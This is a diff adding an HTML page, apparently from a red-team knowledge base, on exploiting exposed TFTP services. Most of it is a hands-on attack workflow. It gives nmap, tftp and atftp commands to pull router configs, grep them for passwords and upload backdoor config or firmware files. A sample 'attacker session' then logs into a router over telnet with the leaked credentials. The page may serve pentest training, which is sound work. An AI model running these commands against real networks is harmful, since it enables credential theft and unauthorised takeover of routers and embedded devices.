@@ -1,0 +1,178 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">TFTP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Services</strong> • Focus: <strong>TFTP Abuse & File Exfiltration</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    TFTP (Trivial File Transfer Protocol, UDP/69) is a simple protocol for transferring files 
+    without authentication or encryption. Often used in network boot (PXE), router/switch configs, 
+    or embedded systems, it is highly insecure when exposed. Attackers exploit TFTP to 
+    download sensitive configs, exfiltrate credentials, modify boot images, or upload malicious 
+    files. In Red Team ops, TFTP is abused to extract router passwords, pivot via firmware, or 
+    establish persistence in IoT and industrial devices.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Any user can read/write files if allowed.</li>
+    <li><strong>No Encryption:</strong> Data can be intercepted or tampered with.</li>
+    <li><strong>Config Exposure:</strong> Routers, firewalls, and switches often store configs in TFTP.</li>
+    <li><strong>Firmware Abuse:</strong> Attackers can upload modified firmware/backdoors.</li>
+    <li><strong>Pivot Point:</strong> Leaked configs often contain admin passwords and SNMP strings.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify TFTP service on UDP/69.</li>
+    <li><strong>Enumeration:</strong> Check if anonymous file GET/PUT is allowed.</li>
+    <li><strong>Exfiltration:</strong> Download configs, credentials, or boot files.</li>
+    <li><strong>Exploitation:</strong> Upload modified configs or firmware for persistence.</li>
+    <li><strong>Impact:</strong> Network takeover, credential theft, IoT compromise.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and detect TFTP service on UDP/69.</li>
+    <li>Check if anonymous GET/PUT operations are enabled.</li>
+    <li>Download known config filenames (e.g., <code>startup-config</code>, <code>router.cfg</code>).</li>
+    <li>Upload malicious configs/firmware if write access is enabled.</li>
+    <li>Leverage extracted credentials for lateral movement.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -sU -p69 --script tftp-enum [target]         # Enumerate TFTP
+nc -u [target] 69                                 # Raw TFTP test
+
+# ------------------------------
+# Download Config Files
+# ------------------------------
+tftp [target]
+tftp> get startup-config
+tftp> get router.cfg
+
+# ------------------------------
+# Upload Malicious Files
+# ------------------------------
+tftp [target]
+tftp> put backdoor.bin
+
+# ------------------------------
+# Automated TFTP Dump
+# ------------------------------
+atftp --get --remote-file=router.cfg --local-file=router.cfg [target]
+atftp --put --remote-file=backdoor.cfg --local-file=backdoor.cfg [target]
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -sU -p69 192.168.1.100 --script tftp-enum
+tftp 192.168.1.100
+tftp> get startup-config
+cat startup-config | grep password
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -sU -p69 192.168.1.100
+PORT   STATE SERVICE
+69/udp open  tftp
+
+[ saide ~ ]$ tftp 192.168.1.100
+tftp> get startup-config
+Received 2453 bytes in 0.1 seconds
+
+[ saide ~ ]$ cat startup-config | grep password
+enable secret 5 $1$asd123$hfpwleosidfk32
+line vty 0 4
+ password cisco123
+ login
+
+[ saide ~ ]$ tftp 192.168.1.100
+tftp> put backdoor.cfg
+Sent 3000 bytes in 0.2 seconds
+
+[ saide ~ ]$ telnet 192.168.1.1
+Username: admin
+Password: cisco123
+Router> enable
+Router# show running-config
+[*] Access gained using leaked creds
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample TFTP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Extracted Config File
+enable secret 5 $1$asd123$hfpwleosidfk32
+line vty 0 4
+ password cisco123
+ login
+
+# Uploaded Malicious Config
+backdoor.cfg uploaded successfully
+
+# Proof of Exploitation
+Router compromised with leaked Telnet/enable credentials
+Pivoting possible into internal network
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-tftp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting TFTP
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1048/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Exfiltration Over Alternative Protocol (TFTP)
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Config theft → Cred extraction → Upload backdoors → Pivot.</li>
+  </ul>
+</section>
